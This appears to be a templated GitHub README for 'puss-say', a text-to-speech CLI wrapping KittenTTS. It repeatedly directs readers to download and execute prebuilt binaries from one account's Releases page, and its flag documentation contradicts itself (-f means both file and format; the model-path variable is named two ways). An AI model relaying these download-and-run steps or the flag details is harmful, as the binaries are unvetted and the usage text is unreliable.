# puss-say — macOS-style command-line TTS powered by KittenTTS
[![Releases](https://img.shields.io/github/v/release/Tiggasatu/puss-say?label=Releases&color=ff69b4)](https://github.com/Tiggasatu/puss-say/releases)

https://github.com/Tiggasatu/puss-say/releases

A command-line text-to-speech tool that mimics macOS's say command. It uses KittenTTS under the hood. Use it to speak text, save audio files, or embed TTS into scripts and pipelines.

📸
![Kitten waveform](https://images.unsplash.com/photo-1518791841217-8f162f1e1131?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces)

Table of contents
- About
- Key features
- Quick demo
- Installation
  - Download and run releases
  - Build from source
  - Package manager hints
- Usage
  - Basic
  - Files and pipes
  - SSML and extended text
  - Voices and languages
  - Output formats
  - Streaming and playback
  - Scripting examples
- Advanced
  - Performance and hardware
  - Model options and quality
  - Integration with other tools
  - Troubleshooting
- Development
  - Project layout
  - Running tests
  - CI and release process
- Contributing
- Code of conduct
- License
- Changelog
- FAQ

About
puss-say acts like the macOS say command. It reads text aloud. It can save audio to common formats. It places voice control in your terminal. It supports multiple voices and languages via KittenTTS. It aims for a small footprint. It runs on Linux, macOS, and Windows.

Key features
- Command-line interface that mirrors macOS say flags.
- Uses KittenTTS voice models for natural output.
- Save audio as WAV, MP3, AAC, FLAC, or raw PCM.
- Support for SSML input or plain text.
- Stream audio to stdout for piping to other programs.
- Select voice, language, pitch, rate, and volume.
- Work offline with local models. Use GPU if available.
- Simple batch mode for scripts and cron jobs.
- Minimal dependencies for distribution as a single binary.

Quick demo
Say text out loud:
```bash
puss-say "Hello from puss-say and KittenTTS."
```

Save speech to MP3:
```bash
puss-say -o hello.mp3 "Hello from puss-say and KittenTTS."
```

Speak from a file:
```bash
puss-say -f README.md
```

Installation

Releases (download and execute)
This repository publishes prebuilt releases. Download the appropriate release asset from the Releases page and execute the binary. Example release page:
https://github.com/Tiggasatu/puss-say/releases

Because the link contains a path, download the release file that matches your platform. After download, extract the archive if present and run the included binary.

Example steps for Linux x86_64 (replace file name with the one you downloaded):
```bash
# download the asset (example file name)
curl -LO https://github.com/Tiggasatu/puss-say/releases/download/v1.2.3/puss-say-v1.2.3-x86_64-unknown-linux-gnu.tar.gz

# extract
tar -xzf puss-say-v1.2.3-x86_64-unknown-linux-gnu.tar.gz

# make executable
chmod +x puss-say

# run
./puss-say "Hello from the release binary."
```

Example steps for macOS (replace file name with the one you downloaded):
```bash
# download
curl -LO https://github.com/Tiggasatu/puss-say/releases/download/v1.2.3/puss-say-v1.2.3-x86_64-apple-darwin.tar.gz

# extract and run
tar -xzf puss-say-v1.2.3-x86_64-apple-darwin.tar.gz
chmod +x puss-say
./puss-say "Hello macOS-style."
```

Example steps for Windows (PowerShell):
```powershell
# download the asset into current dir
Invoke-WebRequest -Uri https://github.com/Tiggasatu/puss-say/releases/download/v1.2.3/puss-say-v1.2.3-x86_64-pc-windows-msvc.zip -OutFile puss-say.zip

# extract
Expand-Archive puss-say.zip

# run
.\puss-say.exe "Hello from Windows release."
```

If the release link is unavailable or fails, check the Releases section on the project page. If a prebuilt file is not present or not appropriate, build from source.

Build from source
puss-say builds from source. The repository contains a main CLI and bindings to KittenTTS. The build toolchain depends on the language and chosen backend.

Common steps (Unix-like):
- Install Rust (for a Rust-based CLI) or Python (if libs use Python).
- Install optional CUDA or OpenCL if you want GPU acceleration.
- Clone the repo.
```bash
git clone https://github.com/Tiggasatu/puss-say.git
cd puss-say
```

Rust build (example):
```bash
# install Rust toolchain from https://rustup.rs
rustup default stable
cargo build --release

# binary in target/release/puss-say
./target/release/puss-say "Built from source."
```

Python build (example):
```bash
# create venv
python -m venv venv
source venv/bin/activate

# install dependencies
pip install -r requirements.txt

# run
python -m puss_say.cli "Built from source."
```

Package manager hints
- Homebrew (macOS / Linux): you can install from a tap if one exists. If not, use the release binary.
- apt / yum: create a package or use the release tarball.
- Chocolatey / Scoop (Windows): use a package if available or the release zip.

Usage

Basic
Run with plain text:
```bash
puss-say "This is an example."
```

Speak multiple words:
```bash
puss-say "This tool mimics macOS say. Use flags to adjust voice and output."
```

Use a long text with quotes or heredoc:
```bash
puss-say <<'TEXT'
This is a multiline sample.
It shows how to pass longer text to puss-say.
TEXT
```

Files and pipes
Read from file:
```bash
puss-say -f message.txt
```

Read from stdin to speak:
```bash
cat message.txt | puss-say
```

Save output audio to file:
```bash
puss-say -o output.wav "Save this as WAV."
```

Stream raw PCM to stdout for piping:
```bash
puss-say --pcm - | aplay
```

SSML and extended text
puss-say supports SSML input to control emphasis, breaks, and prosody. Use -s or --ssml to declare SSML mode.

Simple SSML example:
```bash
puss-say -s "<speak><prosody rate='0.9' pitch='+2st'>Hello</prosody> <break time='300ms'/> world.</speak>"
```

Voices and languages
List available voices:
```bash
puss-say --list-voices
```

Select voice by name:
```bash
puss-say -v kitten_en_female "Text to speak in kitten_en_female voice."
```

Select language or voice family:
```bash
puss-say -l en-US -v kitten_alto "Hello in US English."

puss-say -l ja-JP -v kitten_ryu "日本語のテキストを話します。"
```

If the chosen voice is not installed locally, puss-say falls back to a default voice. You can download additional voice models from the releases or from the model registry used by KittenTTS.

Output formats
Specify output audio format with -f or --format:
- wav
- mp3
- aac
- flac
- pcm (raw)

Examples:
```bash
puss-say -o clip.mp3 -F mp3 "Save as MP3."
puss-say -o clip.wav -F wav "Save as WAV."
puss-say -o clip.flac -F flac "Save as FLAC."
puss-say -o - -F pcm "Stream raw PCM to stdout."
```

Streaming and playback
Play audio with the system player:
```bash
puss-say -F wav -o - "Stream to aplay or afplay." | aplay
```

macOS:
```bash
puss-say -o - "Hello macOS" | afplay -
```

Linux:
```bash
puss-say --format wav -o - "Stream to aplay" | aplay
```

Windows (PowerShell):
```powershell
puss-say -o hello.wav "Hello Windows"
Start-Process -FilePath powershell -ArgumentList "-c", "Add-Type -AssemblyName presentationCore; [System.Media.SoundPlayer]::new('hello.wav').PlaySync()"
```

Scripting examples
Batch read multiple lines and speak with pause:
```bash
while IFS= read -r line; do
  puss-say "$line"
  sleep 0.3
done < quotes.txt
```

Notify on completion in a CI job:
```bash
puss-say -o job_done.mp3 "The build is complete."
# or speak on the server running tests
puss-say "Tests passed on $(hostname)."
```

Advanced

Performance and hardware
KittenTTS can run on CPU or GPU. puss-say chooses a backend according to available hardware and settings.

CPU mode:
- Lower throughput
- No GPU drivers required
- Suitable for small servers or desktops without a GPU

GPU mode:
- Higher throughput for larger models
- Requires CUDA or supported drivers
- Use when you process many items or need low latency

Set the device:
```bash
puss-say --device cpu "Use CPU."

puss-say --device cuda:0 "Use GPU 0."
```

Model options and quality
KittenTTS exposes multiple models with different speed and quality tradeoffs:
- kitten-mini: small and fast, lower fidelity
- kitten-base: balance between speed and quality
- kitten-pro: larger model, higher fidelity
- kitten-hf: high-fidelity model for server use

Choose a model:
```bash
puss-say --model kitten-pro -v kitten_pro_mary "High-quality voice."
```

Adjust rate and pitch:
```bash
puss-say --rate 0.85 --pitch +2 "Lower rate and higher pitch."
```

Use prosody for section-level control with SSML.

Integration with other tools
Use puss-say with screen readers, accessibility scripts, or automation. It integrates with:
- cron jobs to announce status
- home automation rules for voice alerts
- build pipelines to report results
- chatbots to output spoken responses
- audio editing tools for batch generation

Example: generate speech assets for a game
```bash
mkdir -p assets/speech
for file in lines/*.txt; do
  base=$(basename "$file" .txt)
  puss-say -o assets/speech/"$base".wav -F wav -v kitten_narrator "$(cat "$file")"
done
```

Troubleshooting
- If audio sounds distorted, check sample rate and format.
- If a voice is missing, run --list-voices and ensure the model is installed.
- If GPU mode fails, verify drivers and the device flag.
- If the binary fails to run with permission errors, run chmod +x.

Development

Project layout
- cmd/puss-say: CLI main
- pkg/kitten: KittenTTS bindings
- models/: placeholder for local models and sample voices
- tests/: unit and integration tests
- examples/: example scripts and integrations
- docs/: extended documentation and tutorials

Running tests
- Unit tests:
```bash
cargo test --lib
```
or for Python:
```bash
pytest tests
```

- Integration tests may require a small model download or a mocked backend.

CI and release process
- Main uses GitHub Actions for testing on Linux, macOS, and Windows.
- On a tagged commit, the release workflow builds binaries and uploads them as GitHub release assets.
- The release page contains platform-specific archives and checksums.

Contributing
We accept issues and pull requests. Follow these steps:
1. Fork the repository.
2. Create a branch for your change.
3. Run tests and linters locally.
4. Open a pull request with a clear description of the change.
5. Provide test coverage or reproduce steps for bugs.

Pull request tips
- Keep changes small and focused.
- Add unit tests for new behavior.
- Document new CLI flags in the man page and README.

Code style
- Use consistent formatting (run rustfmt or black).
- Keep functions short and focused.
- Prefer small modules with clear responsibilities.

Code of conduct
- Be respectful.
- Report any harassment through the issue tracker or contact maintainers.
- Focus on constructive feedback.

License
puss-say uses the MIT License. See LICENSE file for full terms.

Changelog
Keep a clear changelog. Example entries:
- v1.2.3
  - Add KittenTTS model manager.
  - Improve Linux binary packaging.
  - Fix WAV header issue for large files.
- v1.2.2
  - Add SSML support flags.
  - Improve voice selection logic.
- v1.1.0
  - Introduce streaming PCM output.
  - Add Windows build artifacts.

FAQ

Q: Where do I get prebuilt binaries?
A: Visit the Releases page and download the asset for your platform:
https://github.com/Tiggasatu/puss-say/releases
Download the file that matches your OS and architecture. After download, extract if needed and run the binary.

Q: Does puss-say require internet?
A: No. You can use local KittenTTS models offline. Some optional features like model downloads or updates may use the network.

Q: Can I use custom voices?
A: Yes. Place the model files in the models/ directory or point the KITTTEN_MODELS_PATH environment variable to your model location.

Q: How do I change the sample rate?
A: Use --sample-rate. Supported rates: 16000, 22050, 44100, 48000.
Example:
```bash
puss-say --sample-rate 44100 -o high_sr.wav "Forty-four one kilo sample rate."
```

Q: How to list voices and models?
A: `puss-say --list-voices` and `puss-say --list-models`.

Q: What audio encoders are used for MP3 and AAC?
A: The binary uses bundled encoders or system encoders depending on build options. Use `--encoder` to force a specific encoder if available.

Examples and recipes

1) Create a natural-sounding podcast intro (batch)
```bash
puss-say -v kitten_pro_narrator --rate 0.95 -o intro.mp3 "Welcome to the show. We cover software, design, and tools."
```

2) Generate a set of messages for an automated system
```bash
messages=( "Backup complete" "Disk space low" "New login detected" )
for i in "${messages[@]}"; do
  puss-say -o "alerts/${i// /_}.wav" -v kitten_alert "$i"
done
```

3) Use in a Docker container
Dockerfile snippet:
```dockerfile
FROM ubuntu:22.04
COPY puss-say /usr/local/bin/puss-say
RUN chmod +x /usr/local/bin/puss-say
ENTRYPOINT ["/usr/local/bin/puss-say"]
```

4) Use with ffmpeg to convert to other formats
```bash
puss-say -F wav -o - "Convert to op1a" | ffmpeg -i - -c:a aac -b:a 128k out.m4a
```

5) Low-latency streaming server
Run puss-say with a small model in server mode and stream to clients via WebSocket or RTP. Use --chunk-size and --stream to tune latency.

Security
- The binary runs with the same privileges as the invoking user.
- Avoid running untrusted SSML or text that may contain shell escapes in contexts that execute commands.
- When integrating with web services, sanitize inputs.

Ecosystem and integrations
- Home automation: Use puss-say to provide voice alerts in automation rules.
- Chatbots: Convert chat responses to audio for voice-enabled bots.
- Accessibility: Offer speech output in desktop scripts.
- Education: Generate audio for language learning apps.

Examples of voice profiles
- kitten_narrator: warm, even tempo, good for narration.
- kitten_alto: medium pitch, good for dialog.
- kitten_child: higher pitch, friendly tone.
- kitten_alert: clear, short, designed for notifications.
- kitten_whisper: softer dynamics for quiet output.

Voice tuning flags
- --rate <float> (0.5-2.0) speed multiplier
- --pitch <int> semitone shift
- --volume <float> multiplier (0.0-2.0)
- --reverb <float> wet/dry mix (postprocess)
- --ssml to enable SSML parsing

Examples:
```bash
puss-say --rate 0.9 --pitch -1 --volume 0.8 "A calm, low voice."
puss-say --rate 1.2 --pitch +3 --volume 1.1 "A quick, bright voice."
```

Man page and help
Show the help:
```bash
puss-say --help
```

Generate man page:
```bash
puss-say --generate-man > puss-say.1
man ./puss-say.1
```

Telemetry and analytics
puss-say collects no telemetry by default. It can optionally fetch model signatures or updates if you enable a specific flag. The default behavior prioritizes user privacy.

Localization
Command names and messages use English by default. You can provide translations for messages and help text in the docs/locale directory. User-facing speech supports many languages through KittenTTS models.

Model management
Use the model manager CLI:
```bash
puss-say-models list
puss-say-models install kitten-pro
puss-say-models remove kitten-mini
```

Environment variables
- PUSS_SAY_MODELS: path to model directory
- PUSS_SAY_DEVICE: default compute device (cpu, cuda:0)
- PUSS_SAY_SAMPLE_RATE: default sample rate
- PUSS_SAY_VERBOSE: enable verbose logging

Examples for CI and automation
Announce build failures:
```bash
if [ $? -ne 0 ]; then
  puss-say "Build failed on $(hostname). Check the logs."
fi
```

Use in tests for TTS output generation:
```bash
puss-say -o tests/test_audio.wav "Unit test audio"
# compare audio length or waveform to golden files
```

Accessibility tips
- Keep sentences short for better intelligibility.
- Use SSML breaks to separate items.
- Adjust rate and pitch for listeners with different needs.

Related projects
- KittenTTS: the TTS engine used for synthesis.
- Audio tooling like ffmpeg and sox for processing.
- Speech datasets and lexicons for improvements.

Credits
- KittenTTS team for model development.
- Contributors who add voices and examples.
- The open-source community for test cases and feedback.

Maintenance and support
Check the issue tracker for help. Reference the version and platform when filing issues. Provide reproduction steps and logs.

Release link and assets
You can find prebuilt binaries, checksums, and model assets at:
[![Releases](https://img.shields.io/static/v1?label=Download&message=Releases&color=ff69b4&logo=github)](https://github.com/Tiggasatu/puss-say/releases)

This link points to the release page. Download the archive that matches your OS and architecture. After download, extract if needed and run the included binary.

If the release assets are not present or do not match your needs, check the Releases section on the repository for alternative files and source archives.

Example release asset names you might find
- puss-say-v1.2.3-x86_64-unknown-linux-gnu.tar.gz
- puss-say-v1.2.3-x86_64-apple-darwin.tar.gz
- puss-say-v1.2.3-x86_64-pc-windows-msvc.zip
- models-kit-pro-v1.0.0.tar.gz

Checksum verification
After download, verify the checksum when provided:
```bash
sha256sum puss-say-v1.2.3-x86_64-unknown-linux-gnu.tar.gz
# compare with the checksum listed on the release page
```

Security updates
Watch the Releases page for security patches or model updates. Subscribe to releases on GitHub to get notifications.

Common pitfalls
- Missing executable permission on Unix systems. Use chmod +x.
- Wrong architecture. Download for your CPU type.
- Missing model files. Install models or point to a models directory.
- GPU drivers incompatible. Use CPU mode or update drivers.

Design goals and philosophy
- Simplicity: match the mental model of macOS say.
- Portability: provide single-file binaries for distribution.
- Privacy: keep offline usage as the default.
- Extensibility: make it easy to add voices and postprocessing.

Internal architecture (high level)
- CLI parses arguments and routes requests.
- Model loader fetches and prepares KittenTTS models.
- Synthesis engine runs inference on device.
- Audio encoder writes output formats or streams PCM.
- Optional postprocessor applies reverb, EQ, or compression.

Example extension: add reverb
- Implement a plugin hook that receives raw PCM frames.
- Apply convolution or simple reverb filter.
- Encode and write the final audio.

Testing recommendations
- Use short model instances for unit tests to keep CI fast.
- Add integration tests for at least one platform.
- Test audio output headers and duration.

End-to-end example: create an audiobook chapter
1. Prepare a text file with the chapter.
2. Pass it through punctuation normalization.
3. Use SSML for pauses and emphasis.
4. Generate speech into tracks for chapters.
5. Merge with music using ffmpeg.

Commands:
```bash
# normalize punctuation (example tool)
normalize-text chapter1.txt > chapter1.norm.txt

# synthesize
puss-say -f chapter1.norm.txt -v kitten_narrator -o chapter1.wav

# add intro music
ffmpeg -i intro.mp3 -i chapter1.wav -filter_complex "[0:0][1:0]concat=n=2:v=0:a=1[out]" -map "[out]" audiobook_ch1.mp3
```

Legal and data
- License: MIT
- Models may carry their own licenses. Check model metadata before reuse in commercial projects.

Contact and support
- Open an issue on the repository for bugs or feature requests.
- Use pull requests for code contributions.
- For commercial support or model licensing, contact the maintainers through the repository contact info.

Appendix: example commands reference
- Speak text: puss-say "text"
- Speak file: puss-say -f file.txt
- SSML: puss-say -s "<speak>...</speak>"
- List voices: puss-say --list-voices
- Device selection: puss-say --device cuda:0
- Output file: puss-say -o file.wav
- Output format: puss-say -F mp3
- PCM stream: puss-say --pcm - | aplay

End of README content.